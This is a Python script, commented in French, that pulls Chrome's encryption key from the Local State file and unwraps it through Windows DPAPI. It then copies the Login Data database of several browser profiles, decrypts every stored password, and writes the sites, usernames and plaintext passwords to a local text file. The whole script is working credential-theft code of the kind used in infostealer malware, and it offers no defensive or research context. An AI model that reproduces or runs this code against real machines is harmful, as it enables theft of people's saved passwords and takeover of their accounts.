import os
import sqlite3
import json
import base64
import win32crypt
import shutil
from Cryptodome.Cipher import AES
print("PyCryptodome fonctionne !")


# 📂 Chemin vers la configuration locale de Chrome où se trouve la clé de chiffrement
LOCAL_STATE = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

# 🔐 Fonction pour récupérer la clé AES de Chrome
def get_encryption_key():
    try:
        with open(LOCAL_STATE, "r", encoding="utf-8") as file:
            data = json.load(file)
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Supprime le préfixe "DPAPI"
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"❌ Erreur de récupération de la clé de chiffrement : {e}")
        return None

# 🔓 Fonction pour déchiffrer un mot de passe AES-GCM avec `pycryptodome`
def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]  # 12 premiers octets
        encrypted_password = encrypted_password[15:]  # Reste du message
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password).decode()
    except:
        return "❌ Impossible de déchiffrer"

# 🔑📂 Fonction pour extraire les mots de passe stockés
def extract_passwords():
    key = get_encryption_key()
    if not key:
        return "\n❌ Impossible de récupérer la clé de chiffrement.\n"

    results = "\n🔹 [MOTS DE PASSE STOCKÉS] 🔹\n"
    
    # 📂 Liste des profils possibles
    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
    
    for profile in profiles:
        db_path = os.path.expanduser("~") + f"\\AppData\\Local\\Google\\Chrome\\User Data\\{profile}\\Login Data"
        
        if os.path.exists(db_path):
            # 📂 Fichier temporaire pour contourner le verrouillage
            temp_db_path = f"LoginData_temp_{profile}.db"
            shutil.copy2(db_path, temp_db_path)  # 📂 Créer une copie temporaire pour contourner le verrouillage

            conn = sqlite3.connect(temp_db_path)
            cursor = conn.cursor()

            # 🚀 Essayer plusieurs requêtes SQL pour s'adapter aux différentes versions de Chrome
            try:
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            except:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")

            rows = cursor.fetchall()
            print(f"🔍 Profil `{profile}` : {len(rows)} mots de passe trouvés.")

            if len(rows) == 0:
                results += f"{profile} | ❌ Aucun mot de passe trouvé dans la base de données.\n"

            for row in rows:
                decrypted_password = decrypt_password(row[2], key)
                results += f"🌍 Site : {row[0]} | 📧 Email : {row[1]} | 🔑 Mot de passe : {decrypted_password}\n"

            conn.close()
            os.remove(temp_db_path)  # 🗑 Supprimer le fichier temporaire après utilisation
        else:
            results += f"{profile} | ❌ Fichier Login Data introuvable\n"

    return results

# 📂 Fonction principale
def main():
    print("🔍 Extraction des mots de passe en cours...")
    passwords_data = extract_passwords()

    with open("browser_extracted_data.txt", "w", encoding="utf-8") as f:
        f.write(passwords_data)

    print(f"✅ Extraction terminée ! Données enregistrées dans `browser_extracted_data.txt`")

if __name__ == "__main__":
    main()
